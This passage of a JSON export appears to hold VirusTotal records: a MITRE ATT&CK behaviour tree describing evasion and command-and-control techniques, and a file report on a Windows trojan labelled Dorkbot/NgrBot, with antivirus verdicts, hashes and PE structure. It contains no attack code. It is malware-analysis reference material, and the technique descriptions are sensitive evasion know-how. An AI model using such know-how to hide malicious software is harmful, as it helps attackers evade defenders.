                    "severity": "UNKNOWN",
                    "description": "Detected an attempt to pull out some data from the binary image"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1140/",
                "id": "T1140",
                "name": "Deobfuscate/Decode Files or Information"
              },
              {
                "description": "Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to Subvert Trust Controls by not impacting execution controls such as digital signatures and notarization tickets. \nAdversaries may embed payloads in various file formats to hide payloads. This is similar to Steganography, though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats. \nFor example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary. Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format. \nEmbedded content may also be used as Process Injection payloads used to infect benign system processes. These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Drops interesting files and uses them"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/009/",
                "id": "T1027.009",
                "name": "Embedded Payloads"
              },
              {
                "description": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \nOn Windows, there are a variety of features in scripting languages in Windows, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is powershell.exe -WindowStyle Hidden. \nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Detected the creation of a hidden window (common execution hiding technique)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1564/003/",
                "id": "T1564.003",
                "name": "Hidden Window"
              },
              {
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "SetUnhandledExceptionFilter detected: superseding the top-level exception handler of each thread of a process is a common anti-debug technique."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/",
                "id": "T1027",
                "name": "Obfuscated Files or Information"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Detected HTTP requests to some non white-listed domains"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          }
        ]
      },
      "CAPA": {
        "tactics": [
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk. Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).\nReflective code injection is very similar to Process Injection except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "load .NET assembly"
                  },
                  {
                    "severity": "INFO",
                    "description": "invoke .NET assembly method"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1620/",
                "id": "T1620",
                "name": "Reflective Code Loading"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/8e436dc374b71fcb5168d9bba73804267770466a94f4ac20785009c8799bc803/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65ab9dbc807c154d4a46e6ea"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 EXE",
      "vhash": "025046656d1571c03021z800837z67zd2z68fz",
      "trid": [
        {
          "file_type": "Win32 Executable MS Visual C++ (generic)",
          "probability": 34.6
        },
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 30.6
        },
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 15.6
        },
        {
          "file_type": "Win32 Dynamic Link Library (generic)",
          "probability": 7.3
        },
        {
          "file_type": "Win32 Executable (generic)",
          "probability": 5
        }
      ],
      "creation_date": 1425593107,
      "names": [
        "mvyMacd.exe"
      ],
      "signature_info": {
        "product": "Pleasure",
        "copyright": "Copyright (C) Pleasure 2001-2013",
        "file version": "8.0.0.5",
        "description": "Halfway pictured slept transportation bound"
      },
      "last_modification_date": 1705632455,
      "type_tag": "peexe",
      "times_submitted": 4,
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "size": 274944,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.dorkbot/ngrbot",
        "popular_threat_category": [
          {
            "count": 28,
            "value": "trojan"
          },
          {
            "count": 6,
            "value": "worm"
          }
        ],
        "popular_threat_name": [
          {
            "count": 5,
            "value": "dorkbot"
          },
          {
            "count": 5,
            "value": "ngrbot"
          },
          {
            "count": 2,
            "value": "emotet"
          }
        ]
      },
      "authentihash": "5a9944e3b29ad26744d83d890e74381dad206231cdd0721c5296abc74e24848d",
      "last_submission_date": 1705632455,
      "last_analysis_results": {
        "Bkav": {
          "category": "malicious",
          "engine_name": "Bkav",
          "engine_version": "1.3.0.9899",
          "result": "W32.TodgesteyLTU.Trojan",
          "method": "blacklist",
          "engine_update": "20200723"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "AegisLab",
          "engine_version": "4.2",
          "result": "Worm.Win32.Ngrbot.o!c",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "ClamAV": {
          "category": "malicious",
          "engine_name": "ClamAV",
          "engine_version": "0.102.4.0",
          "result": "Win.Trojan.Emotet-6346832-0",
          "method": "blacklist",
          "engine_update": "20200723"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "32.36.1.0",
          "result": "Generic.mg.e713067e30975d72",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "14.00",
          "result": "Worm.Dorkbot.I4",
          "method": "blacklist",
          "engine_update": "20200723"
        },
        "Qihoo-360": {
          "category": "malicious",
          "engine_name": "Qihoo-360",
          "engine_version": "1.0.0.1120",
          "result": "Win32/Trojan.Multi.daf",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "Generic-FAVZ!E713067E3097",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Cylance": {
          "category": "malicious",
          "engine_name": "Cylance",
          "engine_version": "2.3.1.101",
          "result": "Unsafe",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4136",
          "result": null,
          "method": "blacklist",
          "engine_update": "20200723"
        },
        "Paloalto": {
          "category": "malicious",
          "engine_name": "Paloalto",
          "engine_version": "1.0",
          "result": "generic.ml",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20200423"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "11.124.34798",
          "result": "Trojan ( 004c21261 )",
          "method": "blacklist",
          "engine_update": "20200723"
        },
        "Alibaba": {
          "category": "malicious",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": "VirTool:Win32/CeeInject.cc350cb4",
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "11.124.34798",
          "result": "Trojan ( 004c21261 )",
          "method": "blacklist",
          "engine_update": "20200723"
        },
        "Cybereason": {
          "category": "malicious",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": "malicious.e30975",
          "method": "blacklist",
          "engine_update": "20190616"
        },
        "Invincea": {
          "category": "malicious",
          "engine_name": "Invincea",
          "engine_version": "6.3.6.26157",
          "result": "heuristic",
          "method": "blacklist",
          "engine_update": "20200502"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Prot": {
          "category": "malicious",
          "engine_name": "F-Prot",
          "engine_version": "4.7.1.166",
          "result": "W32/Agent.XL.gen!Eldorado",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20200701"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.11.0.0",
          "result": "Ransom.CryptoWall!g13",
          "method": "blacklist",
          "engine_update": "20200723"
        },
        "TotalDefense": {
          "category": "undetected",
          "engine_name": "TotalDefense",
          "engine_version": "37.1.62.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20200723"
        },
        "APEX": {
          "category": "malicious",
          "engine_name": "APEX",
          "engine_version": "6.51",
          "result": "Malicious",
          "method": "blacklist",
          "engine_update": "20200723"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "18.4.3895.0",
          "result": "Win32:Sharik-H [Trj]",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.24",
          "result": "Malicious (score: 100)",
          "method": "blacklist",
          "engine_update": "20200721"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "15.0.1.13",
          "result": "HEUR:Trojan.Win32.Generic",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.GenericKD.2203448",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.134.25119",
          "result": "Trojan.Win32.NgrBot.doumsi",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "SUPERAntiSpyware": {
          "category": "malicious",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": "Trojan.Agent/Gen-Dropper",
          "method": "blacklist",
          "engine_update": "20200717"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.GenericKD.2203448",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Malware.Win32.Gencirc.10b8ef8d",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Endgame": {
          "category": "undetected",
          "engine_name": "Endgame",
          "engine_version": "4.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20200608"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "4.98.0",
          "result": "Mal/Wonton-BB",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Comodo": {
          "category": "malicious",
          "engine_name": "Comodo",
          "engine_version": "32654",
          "result": "TrojWare.Win32.Crowti.DAEB@5l1aia",
          "method": "blacklist",
          "engine_update": "20200723"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "12.0.86.52",
          "result": "Heuristic.HEUR/AGEN.1115790",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.46.3050",
          "result": "BackDoor.IRC.NgrBot.449",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "85418",
          "result": "Worm.Win32.Dorkbot",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "WORM_DORKBOT.XXPY",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "6.2.142.0",
          "result": "W32/Kryptik.DBVZ!tr",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Trapmine": {
          "category": "malicious",
          "engine_name": "Trapmine",
          "engine_version": "3.5.0.987",
          "result": "malicious.moderate.ml.score",
          "method": "blacklist",
          "engine_update": "20200619"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.7.2019.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2018.12.0.1641",
          "result": "Trojan.GenericKD.2203448 (B)",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "SentinelOne": {
          "category": "undetected",
          "engine_name": "SentinelOne",
          "engine_version": "4.4.0.281",
          "result": null,
          "method": "blacklist",
          "engine_update": "20200721"
        },
        "Cyren": {
          "category": "malicious",
          "engine_name": "Cyren",
          "engine_version": "6.3.0.2",
          "result": "W32/Agent.XL.gen!Eldorado",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Jiangmin": {
          "category": "malicious",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": "Backdoor/Emotet.c",
          "method": "blacklist",
          "engine_update": "20200723"
        },
        "Webroot": {
          "category": "malicious",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": "W32.Trojan.Gen",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.8",
          "result": "HEUR/AGEN.1115790",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2019.9.16.1",
          "result": "malware (ai score=100)",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0.0.1",
          "result": "Worm/Win32.Ngrbot",
          "method": "blacklist",
          "engine_update": "20200723"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "2013.8.14.323",
          "result": null,
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "1.0.0.877",
          "result": "Trojan.Generic.D219F38",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20200723"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:Trojan.Win32.Generic",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Avast-Mobile": {
          "category": "undetected",
          "engine_name": "Avast-Mobile",
          "engine_version": "200723-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20200723"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.17200.2",
          "result": "Trojan:Win32/DorkBot.DU",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.18.1.10026",
          "result": "Trojan/Win32.MDA.R135405",
          "method": "blacklist",
          "engine_update": "20200723"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.1.1.76",
          "result": null,
          "method": "blacklist",
          "engine_update": "20200603"
        },
        "BitDefenderTheta": {
          "category": "malicious",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": "Gen:NN.ZexaF.34138.qq0@aaNjkYaQ",
          "method": "blacklist",
          "engine_update": "20200722"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.1.5",
          "result": "Trojan.GenericKD.2203448",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2020-07-24.01",
          "result": null,
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "VBA32": {
          "category": "malicious",
          "engine_name": "VBA32",
          "engine_version": "4.4.1",
          "result": "Backdoor.IRC.NgrBot",
          "method": "blacklist",
          "engine_update": "20200723"
        },
        "Malwarebytes": {
          "category": "malicious",
          "engine_name": "Malwarebytes",
          "engine_version": "3.6.4.335",
          "result": "Trojan.Agent.DED",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "0.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "21706",
          "result": "a variant of Win32/Injector.BVTN",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "WORM_DORKBOT.XXPY",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.26",
          "result": "Trojan.Injector!8.C4 (CLOUD)",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Yandex": {
          "category": "malicious",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": "Trojan.Agent!ewH21hXwnSg",
          "method": "blacklist",
          "engine_update": "20200707"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "0.1.5.2",
          "result": "Trojan.Win32.Injector",
          "method": "blacklist",
          "engine_update": "20200723"
        },
        "eGambit": {
          "category": "malicious",
          "engine_name": "eGambit",
          "engine_version": null,
          "result": "Unsafe.AI_Score_99%",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.26322B:27.19555",
          "result": "Trojan.GenericKD.2203448",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Ad-Aware": {
          "category": "malicious",
          "engine_name": "Ad-Aware",
          "engine_version": "3.0.5.370",
          "result": "Trojan.GenericKD.2203448",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "18.4.3895.0",
          "result": "Win32:Sharik-H [Trj]",
          "method": "blacklist",
          "engine_update": "20200724"
        },
        "Panda": {
          "category": "malicious",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": "Trj/Genetic.gen",
          "method": "blacklist",
          "engine_update": "20200723"
        },
        "CrowdStrike": {
          "category": "malicious",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": "win/malicious_confidence_80% (D)",
          "method": "blacklist",
          "engine_update": "20190702"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.8164981.susgen",
          "method": "blacklist",
          "engine_update": "20200622"
        }
      },
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "sha256": "d621bb588911e91904b6c1016006eceff57307472986a4bd443b4f20a9c0b1ba",
      "type_extension": "exe",
      "tags": [
        "peexe"
      ],
      "last_analysis_date": 1595557473,
      "unique_sources": 4,
      "first_submission_date": 1425631975,
      "sha1": "32c77630eb5fd02236437bd0431e1f98f1b5da98",
      "ssdeep": "6144:YZVW3sdd4MkJYz47VwAO7T0sgHtEjJOpgVqn6/QloJsqREVSAmM4:YZ8cdd4MkJLa5gHtEjJOWd/HJs/SAmv",
      "md5": "e713067e30975d7263b54a0f41281f0b",
      "pe_info": {
        "resource_details": [
          {
            "lang": "ENGLISH US",
            "entropy": 6.417006492614746,
            "chi2": 9255.7119140625,
            "filetype": "Data",
            "sha256": "1082dd461a140f9d18f3c52cf545b807d3e4c20cb4b4484b59c79ff8906a0c50",
            "type": "RT_BITMAP"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 5.919968128204346,
            "chi2": 11147.626953125,
            "filetype": "Data",
            "sha256": "64574547e45502e7dd777d630498e96cac4b984d2caaf174f3d97517f9f39c58",
            "type": "RT_BITMAP"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 6.533411502838135,
            "chi2": 9026.6484375,
            "filetype": "Data",
            "sha256": "31593c3cce5703aa2f17569fe10bbeaf62a7c9c22d16df20db252ba9775cff57",
            "type": "RT_BITMAP"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 6.169342041015625,
            "chi2": 13982.0390625,
            "filetype": "Data",
            "sha256": "089b755ef2912cae86d686369ba835663f375cf26fe0174b72a9ab0e4523fefb",
            "type": "RT_BITMAP"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 5.615819454193115,
            "chi2": 14997.982421875,
            "filetype": "Data",
            "sha256": "93c18c678655f6700996a849cd1134e39f89b43afd271dc4e0d14f2b18590a00",
            "type": "RT_BITMAP"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 5.441145420074463,
            "chi2": 15542.212890625,
            "filetype": "Data",
            "sha256": "099d89542ac24732ab60a6a8bc86433f48abec980fd381a9c2f88adc16a74105",
            "type": "RT_BITMAP"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 5.70822811126709,
            "chi2": 13999.765625,
            "filetype": "Data",
            "sha256": "0336b4a5d874630e504165bfa90cc63cb067a33d30c0591e2f55c748392c9196",
            "type": "RT_BITMAP"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 5.1953935623168945,
            "chi2": 25727.197265625,
            "filetype": "Data",
            "sha256": "fb0dfdcea663a3f983adfc1f72f07c849b0ccf766dd87506aa5a21af2737bcac",
            "type": "RT_BITMAP"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 4.477148532867432,
            "chi2": 13943.314453125,
            "filetype": "Data",
            "sha256": "805db734900098493e43afc5a2e550409984d5764f5ac3db044bf167b3b1f0bc",
            "type": "RT_BITMAP"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 3.8844730854034424,
            "chi2": 18691.1953125,
            "filetype": "Data",
            "sha256": "ada6358de247b7be09e00da419b318ca47a1186e5e8e50bf3638232a941a1757",
            "type": "RT_BITMAP"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 4.465420246124268,
            "chi2": 10677.4873046875,
            "filetype": "Data",
            "sha256": "71f4c05c81d4472238635856d5997c8613bfb0bb42615f1f0051f079122a9e51",
            "type": "RT_BITMAP"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 3.6002347469329834,
            "chi2": 18855.76953125,
            "filetype": "Data",
            "sha256": "c835b4c0fc681a9b4f0bae388ba27811d77abff53b1d921e498f61870ff33573",
            "type": "RT_BITMAP"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 5.911970615386963,
            "chi2": 13374.98046875,
            "filetype": "Data",
            "sha256": "fec356890dd4b5ee70102d95982b5ec140bd88dd8a9aad5ddbf99edaf9857103",
            "type": "RT_BITMAP"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 3.7786171436309814,
            "chi2": 42681.47265625,
            "filetype": "Data",
            "sha256": "ac850f4bb4339626dcfd37d04e98954b62907592d69da6f2dc019ad6ae31c990",
            "type": "RT_BITMAP"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 2.48002290725708,
            "chi2": 20073.6015625,
            "filetype": "Data",
            "sha256": "d1c144cda64475a83db037bf65addf2c2801c5e324250e250380962efb9c93b6",
            "type": "RT_BITMAP"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 1.3935966491699219,
            "chi2": 81331.8359375,
            "filetype": "Data",
            "sha256": "78e57b25d0c4b2bb75679ef121ac3b87773431dd89ef9933316e05cf6ffa117b",
            "type": "RT_BITMAP"
          },
          {
            "lang": "LITHUANIAN",
            "entropy": 7.982526779174805,
            "chi2": 1943.5445556640625,
            "filetype": "Data",
            "sha256": "290c4d8d797cb48ba0ea909b02cec1a8d43c1e389d85aab82266d98aa1c61782",
            "type": "RT_MESSAGETABLE"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 3.3705995082855225,
            "chi2": 70759.0234375,
            "filetype": "Data",
            "sha256": "2dcf8af2454e85ba7647066b8d656ecf981b8b13adb73000a5a9a2d2f964702a",
            "type": "RT_VERSION"
          },
          {
            "lang": "SWAHILI DEFAULT",
            "entropy": 4.911615371704102,
            "chi2": 4031.47216796875,
            "filetype": "application/xml",
            "sha256": "4bb79dcea0a901f7d9eac5aa05728ae92acb42e0cb22e5dd14134f4421a3d8df",
            "type": "RT_MANIFEST"
          }
        ],
        "rich_pe_header_hash": "5dffcebb281ffe2c1758da92faa30a21",
        "imphash": "8b33e34dd33f48a798b55345d3d38238",
        "compiler_product_versions": [
          "[ASM] VS2008 build 21022 count=34",
          "[ C ] VS2008 build 21022 count=125",
          "[IMP] VS2008 SP1 build 30729 count=17",
          "[---] Unmarked objects count=310",
          "[C++] VS2008 build 21022 count=39",
          "[RES] VS2008 build 21022 count=1",
          "[LNK] VS2008 build 21022 count=1"
        ],
        "resource_langs": {
          "NEUTRAL": 1,
          "LITHUANIAN": 1,
          "ENGLISH US": 16,
          "SWAHILI DEFAULT": 1
        },
        "machine_type": 332,
        "timestamp": 1425593107,
        "resource_types": {
          "RT_BITMAP": 16,
          "RT_MESSAGETABLE": 1,
          "RT_VERSION": 1,
          "RT_MANIFEST": 1
        },
        "sections": [
          {
            "name": ".text",
            "chi2": 1017423.63,
            "virtual_address": 4096,
            "entropy": 6.4,
            "raw_size": 111616,
            "flags": "rx",
            "virtual_size": 111118,
            "md5": "025496ac87b40ed0b9719c9b0868ff33"
          },
          {
            "name": ".rdata",
            "chi2": 928451.69,
            "virtual_address": 118784,
            "entropy": 6.43,
            "raw_size": 50176,
            "flags": "r",
            "virtual_size": 49686,
            "md5": "9828fa732e517b9449f3f241efcdc762"
          },
          {
            "name": ".data",
            "chi2": 679812.94,
            "virtual_address": 172032,
            "entropy": 3.36,
            "raw_size": 6144,
            "flags": "rw",
            "virtual_size": 116716,
            "md5": "b379c4e8e3c34c20d6b18133f30ff520"
          },
          {
            "name": ".rsrc",
            "chi2": 36215.86,
            "virtual_address": 290816,
            "entropy": 7.85,
            "raw_size": 105984,
            "flags": "r",
            "virtual_size": 105564,
            "md5": "741e0859564463cad8a86b0ee69d6670"
          }
        ],
        "import_list": [
          {
            "library_name": "COMDLG32.dll",
            "imported_functions": [
              "GetOpenFileNameA",
              "CommDlgExtendedError"
            ]
          },
          {
            "library_name": "GDI32.dll",
            "imported_functions": [
              "GetDeviceCaps",
              "CreateFontIndirectW",
              "SetBkMode",
              "CreateBrushIndirect",
              "SelectObject",
              "SetBkColor",
